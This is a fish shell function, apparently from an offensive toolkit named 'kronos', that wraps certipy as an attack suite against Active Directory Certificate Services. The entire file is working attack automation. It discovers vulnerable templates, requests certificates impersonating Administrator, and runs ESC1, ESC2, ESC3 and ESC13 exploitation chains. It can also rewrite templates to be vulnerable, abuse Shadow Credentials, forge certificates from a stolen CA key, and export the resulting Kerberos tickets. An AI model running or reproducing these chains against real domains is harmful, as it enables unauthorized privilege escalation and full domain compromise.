# description: Discover, request, and authenticate via AD CS using certipy
function __kronos_cert --description "AD CS attack suite wrapping certipy"
    set -l subactions find req auth abuse template shadow forge
    set -l action $argv[1]
    set -l wizard 0
    
    if test -z "$action"
        if not set -q _flag_quiet
            set action (__kronos_ask_choice "Pick a cert action" "find" $subactions); or return 1
            set wizard 1
        else
            echo "error: action required" >&2; return 1
        end
    else if contains -- "$action" $subactions
        if test (count $argv) -gt 0; and test "$argv[1]" = "$action"; set -e argv[1]; end
        if not set -q _flag_quiet; set wizard 1; end
    end

    argparse t/target= h/help q/quiet u/username= p/password= H/hash= d/domain= k/kerberos c/ca= T/template= P/pfx= U/upn= X/edit-cmd W/wizard target-ip= -- $argv
    or return 1

    if set -q _flag_help
        echo "Usage: kronos cert [find|req|auth|abuse|template|shadow|forge] [OPTIONS]"
        echo ""
        echo "AD CS attack suite wrapping certipy / certipy-ad."
        echo ""
        echo "Actions:"
        echo "  find        Discover vulnerable certificate templates"
        echo "  req         Request a certificate"
        echo "  auth        Authenticate using a PFX file"
        echo "  abuse       Automated abuse chains (ESC1..ESC13)"
        echo "  template    Manage/Modify certificate templates"
        echo "  shadow      Abuse Shadow Credentials (KeyCredentialLink)"
        echo "  forge       Forge certificates using a compromised CA"
        echo ""
        echo "Options:"
        echo "  -t, --target NAME   Target DC/CA Hostname (required for Kerberos)"
        echo "  --target-ip IP      Target DC/CA IP address"
        echo "  -c, --ca NAME       Certificate Authority name"
        echo "  -T, --template NAME Certificate template name"
        echo "  -P, --pfx FILE      Path to PFX file for authentication"
        echo "  -U, --upn NAME      User Principal Name to impersonate (SAN)"
        echo "  -u, --username USER Auth username"
        echo "  -d, --domain NAME   Target domain name"
        echo "  -k, --kerberos      Use Kerberos authentication"
        echo "  -X, --edit-cmd      Inspect and edit the command before execution"
        return 0
    end

    set -l target $_flag_target
    set -l target_ip $_flag_target_ip
    set -l domain $_flag_domain
    set -l auth_user $_flag_username
    set -l auth_pass $_flag_password
    set -l auth_hash $_flag_hash
    set -l ca_name $_flag_ca
    set -l template_name $_flag_template
    set -l pfx_file $_flag_pfx
    set -l upn $_flag_upn

    # 1. Base Logic (Target/Domain/Auth)
    if not set -q _flag_quiet
        if test "$wizard" -eq 1 -o -z "$target"; or set -q _flag_wizard
            set_color cyan; echo "[*] Starting Cert wizard ($action)..."; set_color normal

            # Target Hostname
            set -l def_target "$__KRONOS_CACHE_CERT_TARGET"
            set -l src_target "Cache"
            if test -z "$def_target"
                set def_target "$TGT_HOSTS[1]"; set src_target "TGT_HOSTS"
            end
            set target (__kronos_ask "Target DC Hostname (for SPN)" "$def_target" "$src_target"); or return 1
            set -U __KRONOS_CACHE_CERT_TARGET "$target"

            # Target IP
            set -l def_ip "$__KRONOS_CACHE_CERT_IP"
            set -l src_ip "Cache"
            if test -z "$def_ip"
                set def_ip "$TGT"; set src_ip "TGT"
                if test -z "$def_ip"; set def_ip "$TGT_DC_IP"; set src_ip "TGT_DC_IP"; end
            end
            if test -n "$target_ip"; set def_ip "$target_ip"; set src_ip "CLI Arg"; end
            set target_ip (__kronos_ask "Target IP Address" "$def_ip" "$src_ip"); or return 1
            set -U __KRONOS_CACHE_CERT_IP "$target_ip"

            # Domain
            set -l def_domain "$__KRONOS_CACHE_CERT_DOMAIN"
            set -l src_domain "Cache"
            if test -z "$def_domain"
                set def_domain "$TGT_HOSTS[1]"; set src_domain "TGT_HOSTS"
                if test -z "$def_domain"; set def_domain "$TGT_DC_DOMAIN"; set src_domain "TGT_DC_DOMAIN"; end
            end
            if test -n "$domain"; set def_domain "$domain"; set src_domain "CLI Arg"; end
            set domain (__kronos_ask "Domain Name" "$def_domain" "$src_domain"); or return 1
            set -U __KRONOS_CACHE_CERT_DOMAIN "$domain"

            # Auth
            if contains -- "$action" find req abuse template shadow
                # Kerberos Prompt
                if not set -q _flag_kerberos; and test -z "$auth_pass"; and test -z "$auth_hash"
                    if test (__kronos_ask_confirm "Use Kerberos authentication?" n) = "yes"
                        set _flag_kerberos 1
                    end
                end

                if not set -q _flag_kerberos; and test -z "$auth_user"
                    set -l def_user "$__KRONOS_CACHE_CERT_AUTH_USER"
                    set -l src_user "Cache"
                    if test -z "$def_user"; set def_user "$TGT_USERNAME"; set src_user "TGT_USERNAME"
                    else if test -z "$def_user"; set def_user "$TGT_CRED_USERNAME"; set src_user "TGT_CRED_USERNAME"; end
                    
                    set auth_user (__kronos_ask "Auth Username" "$def_user" "$src_user"); or return 1
                    set -U __KRONOS_CACHE_CERT_AUTH_USER "$auth_user"

                    set -l def_auth_val "$__KRONOS_CACHE_CERT_AUTH_VAL"
                    set -l src_auth_val "Cache"
                    if test -z "$def_auth_val"; set def_auth_val "$TGT_PASSWORD"; set src_auth_val "TGT_PASSWORD"
                    else if test -z "$def_auth_val"; set def_auth_val "$TGT_CRED_PASSWORD"; set src_auth_val "TGT_CRED_PASSWORD"; end

                    set -l auth_input (__kronos_ask "Auth Password or Hash" "$def_auth_val" "$src_auth_val"); or return 1
                    set -U __KRONOS_CACHE_CERT_AUTH_VAL "$auth_input"
                    
                    if string match -rq '^[a-fA-F0-9]{32}:[a-fA-F0-9]{32}$|^[a-fA-F0-9]{32}$' -- "$auth_input"
                        set auth_hash "$auth_input"; set auth_pass ""
                    else
                        set auth_pass "$auth_input"; set auth_hash ""
                    end
                else if set -q _flag_kerberos
                     set auth_user (__kronos_ask "Auth Username (for Kerberos SPN)" "$TGT_USERNAME"); or return 1
                end
            end
        end
    end

    # Fallbacks
    if test -z "$target"; set target "$TGT_HOSTS[1]"; end
    if test -z "$target_ip"; set target_ip "$TGT"; end
    if test -z "$target_ip"; set target_ip "$TGT_DC_IP"; end
    if test -z "$domain"; set domain "$TGT_HOSTS[1]"; end
    if test -z "$auth_user"; set auth_user "$TGT_USERNAME"; end
    if test -z "$auth_pass"; and test -z "$auth_hash"; set auth_pass "$TGT_PASSWORD"; end

    if test -z "$target"; echo "error: hostname required"; return 1; end
    if test -z "$target_ip"; echo "error: IP required"; return 1; end
    if test -z "$domain"; echo "error: domain required"; return 1; end

    # Detect binary
    set -l cert_bin ""
    if command -v certipy-ad >/dev/null; set cert_bin certipy-ad
    else if command -v certipy >/dev/null; set cert_bin certipy
    else; echo "error: certipy not found. run 'kronos install'."; return 1; end

    set -l certipy_auth
    if set -q _flag_kerberos
        set certipy_auth -k -no-pass
    else if test -n "$auth_hash"
        set certipy_auth -hashes "$auth_hash"
    else
        set certipy_auth -p "$auth_pass"
    end

    switch "$action"
        case find
            set -l cmd "$cert_bin find -u \"$auth_user@$domain\" $certipy_auth -target \"$target\" -target-ip \"$target_ip\" -dc-ip \"$target_ip\" -enabled -vulnerable -stdout"
            if set -q _flag_edit_cmd; set cmd (__kronos_edit_cmd "$cmd"); or return 1; end
            echo "[*] Discovering vulnerable certificate templates..."
            __kronos_exec "$cmd"

        case req
            set -l def_ca "$__KRONOS_CACHE_CERT_CA"
            if test -n "$ca_name"; set def_ca "$ca_name"; end
            set ca_name (__kronos_ask "CA Name" "$def_ca"); or return 1
            set -U __KRONOS_CACHE_CERT_CA "$ca_name"

            set -l def_tmpl "$__KRONOS_CACHE_CERT_TEMPLATE"
            if test -n "$template_name"; set def_tmpl "$template_name"; end
            set template_name (__kronos_ask "Template Name" "$def_tmpl"); or return 1
            set -U __KRONOS_CACHE_CERT_TEMPLATE "$template_name"

            set -l cmd "$cert_bin req -u \"$auth_user@$domain\" $certipy_auth -target \"$target\" -target-ip \"$target_ip\" -dc-ip \"$target_ip\" -ca \"$ca_name\" -template \"$template_name\""
            if test -n "$upn"; set cmd "$cmd -upn \"$upn\""; end
            if set -q _flag_edit_cmd; set cmd (__kronos_edit_cmd "$cmd"); or return 1; end
            echo "[*] Requesting certificate for template $template_name..."
            __kronos_exec "$cmd"

        case auth
            set -l def_pfx "$__KRONOS_CACHE_CERT_PFX"
            if test -n "$pfx_file"; set def_pfx "$pfx_file"; end
            set pfx_file (__kronos_ask "PFX File Path" "$def_pfx"); or return 1
            set -U __KRONOS_CACHE_CERT_PFX "$pfx_file"

            set -l cmd "$cert_bin auth -pfx \"$pfx_file\" -domain \"$domain\" -dc-ip \"$target_ip\""
            if set -q _flag_edit_cmd; set cmd (__kronos_edit_cmd "$cmd"); or return 1; end
            echo "[*] Authenticating with PFX $pfx_file..."
            __kronos_exec "$cmd"
            
            set -l pfx_base (string replace -r '\.pfx$' '' -- "$pfx_file")
            if test -f "$pfx_base.ccache"
                set -gx KRB5CCNAME "$PWD/$pfx_base.ccache"
                echo "[+] Ticket saved and exported to KRB5CCNAME=$KRB5CCNAME"
            end

        case template
            set -l def_tmpl "$__KRONOS_CACHE_CERT_TEMPLATE"
            if test -n "$template_name"; set def_tmpl "$template_name"; end
            set template_name (__kronos_ask "Template Name" "$def_tmpl"); or return 1
            set -U __KRONOS_CACHE_CERT_TEMPLATE "$template_name"
            
            set -l sub_action (__kronos_ask_choice "Template Action" "view" view "make-vulnerable (ESC1)"); or return 1
            
            set -l cmd "$cert_bin template -u \"$auth_user@$domain\" $certipy_auth -target \"$target\" -target-ip \"$target_ip\" -template \"$template_name\""
            if test "$sub_action" = "make-vulnerable"
                set cmd "$cmd -write-default-configuration"
            end
            
            if set -q _flag_edit_cmd; set cmd (__kronos_edit_cmd "$cmd"); or return 1; end
            __kronos_exec "$cmd"

        case shadow
            set -l sub_action (__kronos_ask_choice "Shadow Action" "list" list add remove auto); or return 1
            set -l account (__kronos_ask "Target Account Name (e.g. web01\$)" "$auth_user"); or return 1
            
            set -l cmd "$cert_bin shadow -u \"$auth_user@$domain\" $certipy_auth -target \"$target\" -target-ip \"$target_ip\" -account \"$account\" $sub_action"
            if set -q _flag_edit_cmd; set cmd (__kronos_edit_cmd "$cmd"); or return 1; end
            __kronos_exec "$cmd"

        case forge
            set -l ca_pfx (__kronos_ask "CA PFX Path" "ca.pfx"); or return 1
            set -l ca_pass (__kronos_ask "CA PFX Password" ""); or return 1
            set -l forge_user (__kronos_ask "User to Forge" "Administrator"); or return 1
            
            set -l cmd "$cert_bin forge -ca-pfx \"$ca_pfx\" -ca-password \"$ca_pass\" -upn \"$forge_user@$domain\" -subject \"CN=$forge_user,CN=Users,DC="(string replace -a "." ",DC=" -- $domain)"\""
            if set -q _flag_edit_cmd; set cmd (__kronos_edit_cmd "$cmd"); or return 1; end
            __kronos_exec "$cmd"

        case abuse
            set -l chain (__kronos_ask_choice "Select Vulnerability" "ESC1" ESC1 ESC2 ESC3 ESC13); or return 1
            
            set -l def_ca "$__KRONOS_CACHE_CERT_CA"
            set ca_name (__kronos_ask "CA Name" "$def_ca"); or return 1
            set -U __KRONOS_CACHE_CERT_CA "$ca_name"

            set -l def_tmpl "$__KRONOS_CACHE_CERT_TEMPLATE"
            set template_name (__kronos_ask "Template Name" "$def_tmpl"); or return 1
            set -U __KRONOS_CACHE_CERT_TEMPLATE "$template_name"

            switch "$chain"
                case ESC1 ESC2
                    set -l imp_user (__kronos_ask "User to Impersonate" "Administrator"); or return 1
                    echo ""; set_color yellow; echo ">>> [ EXPLOITING $chain ] <<<"; set_color normal
                    set -l cmd "$cert_bin req -u \"$auth_user@$domain\" $certipy_auth -target \"$target\" -target-ip \"$target_ip\" -dc-ip \"$target_ip\" -ca \"$ca_name\" -template \"$template_name\" -upn \"$imp_user@$domain\""
                    if set -q _flag_edit_cmd; set cmd (__kronos_edit_cmd "$cmd"); or return 1; end
                    __kronos_exec "$cmd"
                    
                    if test -f "$imp_user.pfx"
                        echo "[*] Request successful. Authenticating..."
                        __kronos_exec "$cert_bin auth -pfx \"$imp_user.pfx\" -domain \"$domain\" -dc-ip \"$target_ip\""
                    end

                case ESC3
                    set -l imp_user (__kronos_ask "User to Impersonate" "Administrator"); or return 1
                    # Step 1: Request User template
                    echo ""; set_color yellow; echo ">>> [ ESC3 STEP 1: Requesting User Certificate ] <<<"; set_color normal
                    __kronos_exec "$cert_bin req -u \"$auth_user@$domain\" $certipy_auth -target \"$target\" -target-ip \"$target_ip\" -ca \"$ca_name\" -template User"
                    # Step 2: Request with pfx
                    if test -f "$auth_user.pfx"
                        echo ""; set_color yellow; echo ">>> [ ESC3 STEP 2: Requesting on behalf of $imp_user ] <<<"; set_color normal
                        __kronos_exec "$cert_bin req -u \"$auth_user@$domain\" $certipy_auth -target \"$target\" -target-ip \"$target_ip\" -ca \"$ca_name\" -template \"$template_name\" -on-behalf-of \"$domain\\$imp_user\" -pfx \"$auth_user.pfx\""
                    end

                case ESC13
                    # Step 1: Request
                    echo ""; set_color yellow; echo ">>> [ ESC13 STEP 1: Requesting Certificate ] <<<"; set_color normal
                    set -l req_cmd "$cert_bin req -u \"$auth_user@$domain\" $certipy_auth -target \"$target\" -target-ip \"$target_ip\" -dc-ip \"$target_ip\" -ca \"$ca_name\" -template \"$template_name\""
                    if set -q _flag_edit_cmd; set req_cmd (__kronos_edit_cmd "$req_cmd"); or return 1; end
                    __kronos_exec "$req_cmd"

                    # Step 2: Auth
                    set -l pfx_file "$auth_user.pfx"
                    if test -f "$pfx_file"
                        echo ""; set_color yellow; echo ">>> [ ESC13 STEP 2: Authenticating with PFX ] <<<"; set_color normal
                        set -l auth_cmd "$cert_bin auth -pfx \"$pfx_file\" -domain \"$domain\" -dc-ip \"$target_ip\""
                        if set -q _flag_edit_cmd; set auth_cmd (__kronos_edit_cmd "$auth_cmd"); or return 1; end
                        __kronos_exec "$auth_cmd"
                        
                        if test -f "$auth_user.ccache"
                            set -gx KRB5CCNAME "$PWD/$auth_user.ccache"
                            echo "[+] Ticket exported to KRB5CCNAME=$KRB5CCNAME"
                        end
                    end
            end
    end
end
